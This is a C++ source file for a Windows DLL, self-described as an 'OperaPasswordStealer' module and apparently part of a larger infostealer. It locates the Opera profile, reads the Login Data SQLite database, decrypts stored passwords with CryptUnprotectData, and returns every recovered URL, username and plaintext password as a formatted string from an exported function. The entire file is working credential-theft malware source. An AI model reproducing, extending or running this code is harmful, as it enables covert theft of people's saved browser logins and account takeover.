// _s_Module_Browser_Info_OperaPasswordStealer.cpp : Defines the exported functions for the DLL application.
//

#include "stdafx.h"  
#include "_s_Module_Browser_Info_OperaPasswordStealer.h"  
#include <windows.h>
#include <Shlwapi.h>
#include <Shlobj.h>
#include <string>
#include <vector>
#include <cstdio>
#include <stdio.h>
#include <stdlib.h>
#include<wincrypt.h>
#pragma comment (lib, "shlwapi.lib")
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "Shell32.lib")
#pragma comment (lib, "comsuppw.lib")




char * LoadFileIntoString(PCWSTR pwszFileName)
{
	HANDLE handle = CreateFile(pwszFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	char * pszResult = NULL;
	if (handle != INVALID_HANDLE_VALUE)
	{
		DWORD cbFile = GetFileSize(handle, NULL);
		if (cbFile != INVALID_FILE_SIZE)
		{
			pszResult = (char *)malloc(cbFile + 1);
			if (pszResult != NULL)
			{
				pszResult[cbFile] = 0;
				DWORD cbRead;
				if (!ReadFile(handle, pszResult, cbFile, &cbRead, NULL) || cbRead != cbFile)
				{
					free(pszResult);
					pszResult = NULL;
				}
			}
		}

		CloseHandle(handle);
	}

	return pszResult;
}

// not the nicest solution, but it does not require a complete JSON reader library
bool IsPortable()
{
	WCHAR lpszPath[MAX_PATH];
	!SHGetSpecialFolderPath(NULL, lpszPath, CSIDL_PROGRAM_FILES, FALSE);
	WCHAR JsonPath[MAX_PATH];
	wcscpy(JsonPath, lpszPath);
	wcscat(JsonPath, FILENAME_INSTALLER_PREFS_JSON);
	char * pszInstallerPrefsJson = LoadFileIntoString(JsonPath);
	if (pszInstallerPrefsJson == NULL)
		return false;

	bool fIsPortable = strstr(pszInstallerPrefsJson, "\"single_profile\": true") != NULL;
	free(pszInstallerPrefsJson);
	return fIsPortable;
}

// not the nicest solution, but it does not require using MSXML or other XML library
PCWSTR GetChannel()
{

	WCHAR lpszPath[MAX_PATH];
	!SHGetSpecialFolderPath(NULL, lpszPath, CSIDL_PROGRAM_FILES, FALSE);
	WCHAR IStatus[MAX_PATH];
	wcscpy(IStatus, lpszPath);
	wcscat(IStatus, FILENAME_INSTALLATION_STATUS);

	char * pszInstallationStatusXml = LoadFileIntoString(IStatus);
	if (pszInstallationStatusXml == NULL)
		return NULL;

	PCWSTR pwszChannel = NULL;
	if (strstr(pszInstallationStatusXml, "Software\\Classes\\OperaDeveloper") != NULL)
		pwszChannel = L"Opera Developer";
	else if (strstr(pszInstallationStatusXml, "Software\\Classes\\OperaNext") != NULL)
		pwszChannel = L"Opera Next";
	else if (strstr(pszInstallationStatusXml, "Software\\Classes\\OperaStable") != NULL)
		pwszChannel = L"Opera Stable";
	free(pszInstallationStatusXml);
	return pwszChannel;
}

// safe version of the API function
PWSTR PathAddBackslash_s(PWSTR pwszPath, int cchPath)
{
	int cch = wcslen(pwszPath);
	if (cch <= 0 || (pwszPath[cch - 1] == '\\' || pwszPath[cch - 1] == '/') || cch >= cchPath - 1)
		return pwszPath + cch;

	pwszPath[cch] = '\\';
	pwszPath[cch + 1] = 0;
	return pwszPath + cch + 1;
}

// safe version of the API function
void PathAppend_s(PWSTR pwszPath, int cchPath, PCWSTR pwszMore)
{
	PWSTR pwszPath1 = PathAddBackslash_s(pwszPath, cchPath);
	wcscpy_s(pwszPath1, cchPath - (pwszPath1 - pwszPath), pwszMore);
}

// safe version of the API function
PCWSTR PathCombine_s(PWSTR pwszPathOut, int cchPathOut, PCWSTR pwszPathIn, PCWSTR pwszMore)
{
	wcscpy_s(pwszPathOut, cchPathOut, pwszPathIn);
	PathAppend_s(pwszPathOut, cchPathOut, pwszMore);
	return pwszPathOut;
}

bool GetOperaProfileFolder(PWSTR pwsz, int cch)
{
	if (IsPortable())
	{
		GetCurrentDirectory(cch, pwsz);
		PathAppend_s(pwsz, cch, L"profile\\data");
		return true;
	}

	if (cch < MAX_PATH)
		return false;

	PCWSTR pwszChannel = GetChannel();
	if (pwszChannel == NULL)
		return false;

	if (FAILED(SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, pwsz)))
		return false;

	PathAppend_s(pwsz, cch, L"Opera Software");
	PathAppend_s(pwsz, cch, pwszChannel);
	return true;
}

BYTE *ClearPassword(BYTE * inp)
{
	for (int i = 0; ;i++)
	{
		if (inp[i] == 03 || inp[i] == 01)
		{
			inp[i] = '\0';
			break;
		}
	}
	return inp;
}



HRESULT ProcessPasswords(PCWSTR pwszSourceFolder, PCWSTR pwszTargetFolder, bool fDecrypt)
{
	WCHAR wszSourceLoginData[MAX_PATH];
	WCHAR wszSourceLoginDataJournal[MAX_PATH];
	WCHAR wszBackupLoginData[MAX_PATH];
	WCHAR wszBackupLoginDataJournal[MAX_PATH];
	WCHAR wszTargetLoginData[MAX_PATH];
	WCHAR wszTargetLoginDataJournal[MAX_PATH];
	WCHAR wszTempLoginData[MAX_PATH];
	WCHAR wszTempLoginDataJournal[MAX_PATH];
	char szTempLoginData[MAX_PATH];

	PathCombine_s(wszSourceLoginData, MAX_PATH, pwszSourceFolder, FILENAME_LOGIN_DATA);
	PathCombine_s(wszSourceLoginDataJournal, MAX_PATH, pwszSourceFolder, FILENAME_LOGIN_DATA EXTENSION_JOURNAL);

	if (!PathFileExists(wszSourceLoginData) || !PathFileExists(wszSourceLoginDataJournal))
		return S_OK; // nothing to do


	WideCharToMultiByte(CP_ACP, 0, wszSourceLoginData, MAX_PATH, szTempLoginData, MAX_PATH, NULL, NULL);
	sqlite3 * pDatabase = NULL;
	sqlite3_stmt * pJournal = NULL;
	sqlite3_stmt * pSelect = NULL;
	sqlite3_stmt * pUpdate = NULL;
	sqlite3_stmt * pBeginTransaction = NULL;
	sqlite3_stmt * pCommit = NULL;
	int nResult = sqlite3_open(szTempLoginData, &pDatabase);
	if (nResult == SQLITE_OK)
		nResult = sqlite3_prepare(pDatabase, "PRAGMA journal_mode = PERSIST", -1, &pJournal, NULL);
	if (nResult == SQLITE_OK)
		nResult = sqlite3_prepare(pDatabase, "BEGIN TRANSACTION", -1, &pBeginTransaction, NULL);
	if (nResult == SQLITE_OK)
		nResult = sqlite3_prepare(pDatabase, "COMMIT", -1, &pCommit, NULL);
	if (nResult == SQLITE_OK)
		nResult = sqlite3_prepare(pDatabase, "SELECT origin_url, username_element, username_value, password_element, submit_element, signon_realm, password_value FROM logins", -1, &pSelect, NULL);
	//if (nResult == SQLITE_OK)
	//	nResult = sqlite3_prepare(pDatabase, "UPDATE logins SET password_value = ? WHERE origin_url = ? AND username_element = ? AND username_value = ? AND password_element = ? AND submit_element = ? AND signon_realm = ?", -1, &pUpdate, NULL);

	if (nResult == SQLITE_OK)
	{
		nResult = sqlite3_step(pJournal);
		if (nResult == SQLITE_ROW)
			nResult = sqlite3_step(pBeginTransaction);
		if (nResult == SQLITE_DONE)
			nResult = SQLITE_OK;
	}

	if (nResult == SQLITE_OK)
	{
		for (int i = 0;;i++)
		{
			nResult = sqlite3_step(pSelect);
			if (nResult != SQLITE_ROW)
				break;

			DATA_BLOB input;
			DATA_BLOB output = { 0 };
			input.cbData = sqlite3_column_bytes(pSelect, 6);
			input.pbData = (BYTE *)(input.cbData ? sqlite3_column_blob(pSelect, 6) : "");

			if ((fDecrypt && input.cbData > 0 && input.pbData[0] != 0x01) ||
				(!fDecrypt && input.cbData > 0 && input.pbData[0] == 0x01))
				continue;
			if ((fDecrypt && !CryptUnprotectData(&input, NULL, NULL, NULL, NULL, 0, &output)) ||
				(!fDecrypt && !CryptProtectData(&input, NULL, NULL, NULL, NULL, 0, &output)))
				continue;

			output.pbData = ClearPassword(output.pbData);
			info[i].it = true;
			info[i + 1].it = false;
			strcpy(info[i].upass, (char *)output.pbData);


			input.cbData = sqlite3_column_bytes(pSelect, 2);
			input.pbData = (BYTE *)(input.cbData ? sqlite3_column_blob(pSelect, 2) : "");
			strcpy(info[i].uname, (char *)input.pbData);

			input.cbData = sqlite3_column_bytes(pSelect, 0);
			input.pbData = (BYTE *)(input.cbData ? sqlite3_column_blob(pSelect, 0) : "");
			strcpy(info[i].url, (char *)input.pbData);

		}
	}
	OutputDebugStringA(info[0].url);
	return S_OK;
}
int Error(int nCode, PCWSTR pwszFormat, ...)
{
	//WCHAR wszText[1024];
	//va_list args;
	//va_start(args, pwszFormat);
	//vswprintf_s(wszText, 1024, pwszFormat, args);
	//va_end(args);
	//MessageBox(GetActiveWindow(), wszText, L"Error", MB_OK | MB_ICONERROR);
	return nCode;
}






BSTR ANSItoBSTR(const char* input)
{
	BSTR result = NULL;
	int lenA = lstrlenA(input);
	int lenW = ::MultiByteToWideChar(CP_ACP, 0, input, lenA, NULL, 0);
	if (lenW > 0)
	{
		result = ::SysAllocStringLen(0, lenW);
		::MultiByteToWideChar(CP_ACP, 0, input, lenA, result, lenW);
	}
	return result;
}


BSTR ConvertInfoToBstr()
{
	_bstr_t  RetValue = L"";
	_bstr_t  OneValue = L"";
	char  OneInfo[2048];
	for (int i = 0;;i++)
	{
		if (info[i].it)
		{

			sprintf(OneInfo, "Url=%s\r\nUserName=%s\r\nPassword=%s\r\n", info[i].url, info[i].uname, info[i].upass);
			OneValue = ANSItoBSTR(OneInfo);

			RetValue += OneValue;
			info[i].it = false;
		}
		else
		{
			break;
		}
	}
	return RetValue;
}

BSTR  GetOperaPasswordFromDLL()
{
	info = new INFO[500];

	WCHAR wszLauncherExe[MAX_PATH];
	WCHAR wszProfileFolder[MAX_PATH];
	WCHAR wszPasswordsFolder[MAX_PATH];
	WCHAR wszLockFile[MAX_PATH];
	WCHAR wszPreferences[MAX_PATH];

	WCHAR lpszPath[MAX_PATH];
	!SHGetSpecialFolderPath(NULL, lpszPath, CSIDL_PROGRAM_FILES, FALSE);
	WCHAR LuncherPath[MAX_PATH];
	wcscpy(LuncherPath, lpszPath);
	wcscat(LuncherPath, FILENAME_LAUNCHER_EXE);

	lstrcpy(wszLauncherExe, L"");
	PathAppend_s(wszLauncherExe, MAX_PATH, LuncherPath);
	if (!PathFileExists(wszLauncherExe))
	{
		
	}


	if (!GetOperaProfileFolder(wszProfileFolder, MAX_PATH))
	{
		return 0;
	}

	PathCombine_s(wszPreferences, MAX_PATH, wszProfileFolder, FILENAME_PREFERENCES);
	if (!PathFileExists(wszPreferences))
	{
		
	}

	PathCombine_s(wszLockFile, MAX_PATH, wszProfileFolder, FILENAME_LOCKFILE);
	HRESULT hr = PathFileExists(wszLockFile) ? S_OK : ProcessPasswords(wszProfileFolder, wszProfileFolder, true);

	return ConvertInfoToBstr();
}


